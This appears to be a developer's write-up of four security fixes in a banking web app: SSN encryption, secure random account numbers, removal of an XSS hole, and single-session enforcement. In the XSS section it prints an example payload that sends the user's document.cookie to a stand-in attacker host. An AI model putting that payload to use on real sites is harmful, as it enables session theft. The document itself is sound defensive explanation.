# Security Bug Fixes

Fixed 4 critical security vulnerabilities.

---

## SEC-301: SSN Storage (CRITICAL)

**What Caused It**

Social Security Numbers were stored in plaintext in the database. Anyone with database access could see them directly:

```sql
SELECT ssn FROM users;
-- Returns: "123456789"
```

This is a severe compliance violation (GDPR, CCPA, PCI DSS) and creates massive identity theft risk if the database is ever compromised.

**How I Fixed It**

Created encryption utilities using AES-256-CBC encryption:

1. Created `utils/encryption.ts` with encrypt/decrypt functions
2. Updated signup to encrypt SSN before saving:

```typescript
import { encryptSSN } from '@/utils/encryption';

await db.insert(users).values({
  ...input,
  ssn: encryptSSN(input.ssn), // Encrypted before saving
  password: hashedPassword,
});
```

Encrypted format in database: `a1b2c3d4...` (16-byte IV + encrypted data)

The encryption key is stored in an environment variable, not in code.

**Preventive Measures**
- Set ENCRYPTION_KEY environment variable (use `openssl rand -hex 32`)
- Encrypt all PII fields (SSN, credit cards, etc.)
- Store encryption keys in secure vaults (AWS KMS, HashiCorp Vault)
- Rotate keys regularly
- Never commit keys to git

---

## SEC-302: Insecure Random Numbers

**What Caused It**

Account numbers were generated using Math.random():

```typescript
// Before - INSECURE
return Math.floor(Math.random() * 1000000000).toString();
```

Math.random() is NOT cryptographically secure. It uses a predictable algorithm, so attackers could potentially guess future account numbers by observing patterns in existing ones.

**How I Fixed It**

Switched to crypto.randomBytes() which uses the operating system's secure random number generator:

```typescript
import crypto from 'crypto';

const randomBytes = crypto.randomBytes(5);
const randomNumber = randomBytes.readUIntBE(0, 5);
const accountNumber = (randomNumber % 10000000000).toString().padStart(10, '0');
```

This is cryptographically secure and unpredictable.

**Preventive Measures**
- NEVER use Math.random() for security-sensitive values (passwords, tokens, IDs)
- ALWAYS use crypto.randomBytes() or crypto.randomUUID()
- Add ESLint rule to flag Math.random() usage
- Code review checklist: check for weak random

---

## SEC-303: XSS Vulnerability (CRITICAL)

**What Caused It**

Transaction descriptions were rendered with `dangerouslySetInnerHTML`, which allows HTML/JavaScript execution:

```tsx
// Before - DANGEROUS
<span dangerouslySetInnerHTML={{ __html: transaction.description }} />
```

An attacker could create a transaction with a malicious description:
```javascript
<script>fetch('https://attacker.com/steal?data=' + document.cookie)</script>
```

This would execute in every user's browser who views the transaction.

**How I Fixed It**

Removed dangerouslySetInnerHTML completely:

```tsx
// After - SAFE
<td>{transaction.description || "-"}</td>
```

React automatically escapes HTML entities, so `<script>` becomes `&lt;script&gt;` and displays as text instead of executing.

Tested by injecting various XSS payloads - all displayed as text, none executed.

**Preventive Measures**
- Never use dangerouslySetInnerHTML unless absolutely necessary
- If HTML rendering is required, use DOMPurify to sanitize first
- Add Content Security Policy headers
- Code review: flag all dangerouslySetInnerHTML usage
- Test with XSS payloads

---

## SEC-304: Session Management

**What Caused It**

Users could have multiple active sessions at the same time:

```typescript
// Before - just adds new session
await db.insert(sessions).values({
  userId: user.id,
  token,
  expiresAt: ...
});
```

Scenario:
1. User logs in from home laptop → Session A created
2. User logs in from work desktop → Session B created (Session A still active)
3. Laptop gets stolen → Attacker has Session A for 7 days
4. User logs out from desktop → Only Session B deleted, Session A still works

**How I Fixed It**

Delete old sessions when creating new ones:

```typescript
// In signup and login
await db.delete(sessions).where(eq(sessions.userId, user.id));

// Then create new session
await db.insert(sessions).values({...});
```

Now only one session per user. New login invalidates all previous sessions.

**Preventive Measures**
- Implement "logout everywhere" button
- Show list of active sessions to users
- Log session IP address and device info
- Alert on suspicious login patterns
- Consider allowing N concurrent sessions with limit

---

## Summary

Fixed 4 critical security bugs:
- SSN encryption (compliance)
- Secure random numbers
- XSS prevention
- Session management

Main issues:
- Sensitive data wasn't encrypted
- Weak cryptographic implementations
- Trusting user input without sanitization
- Poor session lifecycle management

Files changed:
- utils/encryption.ts (new)
- server/routers/auth.ts
- server/routers/account.ts
- components/TransactionList.tsx

These were the highest priority bugs due to severe security and compliance risks.